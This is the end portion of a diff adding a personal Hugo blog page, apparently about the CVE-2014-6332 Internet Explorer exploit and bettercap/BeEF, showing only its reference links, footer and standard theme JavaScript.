+<p><a href="https://www.exploit-db.com/exploits/35308">Microsoft Internet Explorer OLE Pre-IE11 - Automation Array Remote Code Execution / PowerShell VirtualAlloc (MS14-064) - Windows remote Exploit</a></p>
+</li>
+<li>
+<p><a href="http://securityintelligence.com/ibm-x-force-researcher-finds-significant-vulnerability-in-microsoft-windows">IBM X-Force Researcher Finds Significant Vulnerability in Microsoft Windows</a></p>
+</li>
+<li>
+<p><a href="https://forsec.nl/2014/11/cve-2014-6332-internet-explorer-msf-module">CVE-2014-6332: it’s raining shells | forsec</a></p>
+</li>
+<li>
+<p><a href="https://usstzt.site/2020/05/26/bettercap%E7%9A%84%E4%BD%BF%E7%94%A8/#&amp;gid=1&amp;pid=2">kali bettercap的使用 | UsstZt</a></p>
+</li>
+<li>
+<p><a href="https://blog.csdn.net/qq_33066259/article/details/80737308">Bettercap2.6与beef的使用_请你吃橘子-CSDN博客</a></p>
+</li>
+<li>
+<p><a href="https://www.deepl.com/translator#en/zh/This%20module%20exploits%20the%20Windows%20OLE%20Automation%20array%20vulnerability%2C%20CVE-2014-6332.%20The%20vulnerability%20is%20known%20to%20affect%20Internet%20Explorer%203.0%20until%20version%2011%20within%20Windows%2095%20up%20to%20Windows%2010%2C%20and%20no%20patch%20for%20Windows%20XP.%20However%2C%20this%20exploit%20will%20only%20target%20Windows%20XP%20and%20Windows%207%20box%20due%20to%20the%20Powershell%20limitation.%20Windows%20XP%20by%20defaults%20supports%20VBS%2C%20therefore%20it%20is%20used%20as%20the%20attack%20vector.%20On%20other%20newer%20Windows%20systems%2C%20the%20exploit%20will%20try%20using%20Powershell%20instead.">DeepL Translate</a></p>
+</li>
+</ul>
+
+                    
+                    <HR width="100%" id="EOF">
+		    <p style="color:#777;">最后修改于 2021-02-02</p>
+                    
+                </div>
+            </div>
+            
+            
+            <nav class="post-pagination">
+
+                
+                <a class="newer-posts">
+			下回<br>已经到头啦。
+                </a>
+                
+                
+                
+                <a class="older-posts" href="https://weepingdogel.github.io/posts/%E5%A6%82%E4%BD%95%E8%A7%A3%E5%86%B3_gvfs_%E5%9C%A8_i3wm_%E4%B8%8B%E6%97%A0%E6%B3%95%E6%8C%82%E8%BD%BD%E7%9A%84%E9%97%AE%E9%A2%98/">
+			上回<br>如何解决 gvfs 在 i3wm 下无法挂载的问题
+                </a>
+                
+            </nav>
+            <div class="post-comment-wrapper">
+                
+
+
+<div id="gitalk-container"></div>
+
+
+
+
+
+
+            </div>
+        </div>
+    </div>
+</div>
+
+            </div><div id="single-column-footer">
+Hugo Theme <a href="https://github.com/amazingrise/hugo-theme-diary">Diary</a> by <a href="https://amazingrise.net">Rise</a>
+<br>
+移植自 <a href="https://mak1t0.cc/" target="_blank" rel="noreferrer noopener">Makito</a>'s <a href="https://github.com/SumiMakito/hexo-theme-journal/" target="_blank" rel="noreferrer noopener">Journal.</a> <br>
+<br>
+
+&copy;
+	
+	WeepingDogel 本站遵循 CC-BY-NC 4.0 协议
+	
+</div>
+            </div>
+    <script>
+let app;
+
+app = new Vue({
+    el: '#app',
+    data: {
+        scrollY: 0,
+        navOpacity: 0,
+        isDrawerOpen: false,
+        mounted: false,
+        isDarkMode: false
+    },
+    methods: {
+            sgn(t, x) {
+                let k = 1. / (1. - 2 * t);
+                if (x <= t) return 0;
+                else if (x >= 1 - t) return 1;
+                else {
+                    return k * (x - t);
+                }
+            },
+            handleScroll() {
+                this.scrollY = window.scrollY;
+                this.navOpacity = this.sgn(.0, Math.min(1, Math.max(0, window.scrollY / (this.pageHeadHeight() - this.navBarHeight() * 0.8))));
+                const {navBar, navBackground, navTitle, extraContainer, streamContainer} = this.$refs;
+
+                if (this.navOpacity >= 1) {
+                    navBackground.style.opacity = 1;
+                    navTitle.style.opacity = 1;
+                } else {
+                    navBackground.style.opacity = 0;
+                    navTitle.style.opacity = 0;
+                }
+            },
+            handleResize() {
+                const {navBar, navBackground, navTitle, extraContainer, streamContainer} = this.$refs;
+                extraContainer.style.left = (streamContainer.offsetWidth - extraContainer.offsetWidth) + 'px';
+            },
+            navBarHeight() {
+                return this.$refs.navBar.offsetHeight;
+            },
+            pageHeadHeight() {
+                return this.$refs.pageHead.offsetHeight;
+            },
+            toggleDrawer() {
+                this.isDrawerOpen = !this.isDrawerOpen;
+                document.getElementsByTagName('html')[0].style.overflow = this.isDrawerOpen ? 'hidden' : 'unset';
+            },
+            closeDrawer() {
+                this.isDrawerOpen = false;
+                document.getElementsByTagName('html')[0].style.overflow = this.isDrawerOpen ? 'hidden' : 'unset';
+            },
+            toggleDarkMode() {
+                this.isDarkMode = !this.isDarkMode;
+                if (this.isDarkMode==true){
+                    document.cookie = "night=1;path=/";
+                    document.body.classList.add("night");
+                } else {
+                    document.cookie = "night=0;path=/";
+                    document.body.classList.remove("night");
+                }
+            }
+    },
+    created() {
+        window.addEventListener('scroll', this.handleScroll);
+        window.addEventListener('resize', this.handleResize);
+        window._nonDesktop = function () {
+            let check = false;
+            (function (a) {
+                if (/(android|bb\d+|meego).+mobile|avantgo|bada\/|blackberry|blazer|compal|elaine|fennec|hiptop|iemobile|ip(hone|od)|iris|kindle|lge |maemo|midp|mmp|mobile.+firefox|netfront|opera m(ob|in)i|palm( os)?|phone|p(ixi|re)\/|plucker|pocket|psp|series(4|6)0|symbian|treo|up\.(browser|link)|vodafone|wap|windows ce|xda|xiino|android|ipad|playbook|silk/i.test(a) || /1207|6310|6590|3gso|4thp|50[1-6]i|770s|802s|a wa|abac|ac(er|oo|s\-)|ai(ko|rn)|al(av|ca|co)|amoi|an(ex|ny|yw)|aptu|ar(ch|go)|as(te|us)|attw|au(di|\-m|r |s )|avan|be(ck|ll|nq)|bi(lb|rd)|bl(ac|az)|br(e|v)w|bumb|bw\-(n|u)|c55\/|capi|ccwa|cdm\-|cell|chtm|cldc|cmd\-|co(mp|nd)|craw|da(it|ll|ng)|dbte|dc\-s|devi|dica|dmob|do(c|p)o|ds(12|\-d)|el(49|ai)|em(l2|ul)|er(ic|k0)|esl8|ez([4-7]0|os|wa|ze)|fetc|fly(\-|_)|g1 u|g560|gene|gf\-5|g\-mo|go(\.w|od)|gr(ad|un)|haie|hcit|hd\-(m|p|t)|hei\-|hi(pt|ta)|hp( i|ip)|hs\-c|ht(c(\-| |_|a|g|p|s|t)|tp)|hu(aw|tc)|i\-(20|go|ma)|i230|iac( |\-|\/)|ibro|idea|ig01|ikom|im1k|inno|ipaq|iris|ja(t|v)a|jbro|jemu|jigs|kddi|keji|kgt( |\/)|klon|kpt |kwc\-|kyo(c|k)|le(no|xi)|lg( g|\/(k|l|u)|50|54|\-[a-w])|libw|lynx|m1\-w|m3ga|m50\/|ma(te|ui|xo)|mc(01|21|ca)|m\-cr|me(rc|ri)|mi(o8|oa|ts)|mmef|mo(01|02|bi|de|do|t(\-| |o|v)|zz)|mt(50|p1|v )|mwbp|mywa|n10[0-2]|n20[2-3]|n30(0|2)|n50(0|2|5)|n7(0(0|1)|10)|ne((c|m)\-|on|tf|wf|wg|wt)|nok(6|i)|nzph|o2im|op(ti|wv)|oran|owg1|p800|pan(a|d|t)|pdxg|pg(13|\-([1-8]|c))|phil|pire|pl(ay|uc)|pn\-2|po(ck|rt|se)|prox|psio|pt\-g|qa\-a|qc(07|12|21|32|60|\-[2-7]|i\-)|qtek|r380|r600|raks|rim9|ro(ve|zo)|s55\/|sa(ge|ma|mm|ms|ny|va)|sc(01|h\-|oo|p\-)|sdk\/|se(c(\-|0|1)|47|mc|nd|ri)|sgh\-|shar|sie(\-|m)|sk\-0|sl(45|id)|sm(al|ar|b3|it|t5)|so(ft|ny)|sp(01|h\-|v\-|v )|sy(01|mb)|t2(18|50)|t6(00|10|18)|ta(gt|lk)|tcl\-|tdg\-|tel(i|m)|tim\-|t\-mo|to(pl|sh)|ts(70|m\-|m3|m5)|tx\-9|up(\.b|g1|si)|utst|v400|v750|veri|vi(rg|te)|vk(40|5[0-3]|\-v)|vm40|voda|vulc|vx(52|53|60|61|70|80|81|83|85|98)|w3c(\-| )|webc|whit|wi(g |nc|nw)|wmlb|wonu|x700|yas\-|your|zeto|zte\-/i.test(a.substr(0, 4))) check = true;
+            })(navigator.userAgent || navigator.vendor || window.opera);
+            return check;
+        };
+        
+        var night = document.cookie.replace(/(?:(?:^|.*;\s*)night\s*\=\s*([^;]*).*$)|^.*$/, "$1");
+        if (night==""){
+            if (window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches) {
+                
+            }
+        }else{
+            
+            if (night=="1") {
+                this.toggleDarkMode();
+            }
+        }
+    },
+    mounted() {
+        this.handleScroll();
+        this.handleResize();
+        this.mounted = true;
+
+        
+    },
+    destroyed() {
+        window.removeEventListener('scroll', this.handleScroll);
+        window.removeEventListener('resize', this.handleResize);
+    }
+});
+</script>
+
+<script src="https://weepingdogel.github.io//js/journal.js"></script>
+    </body>
+</html>
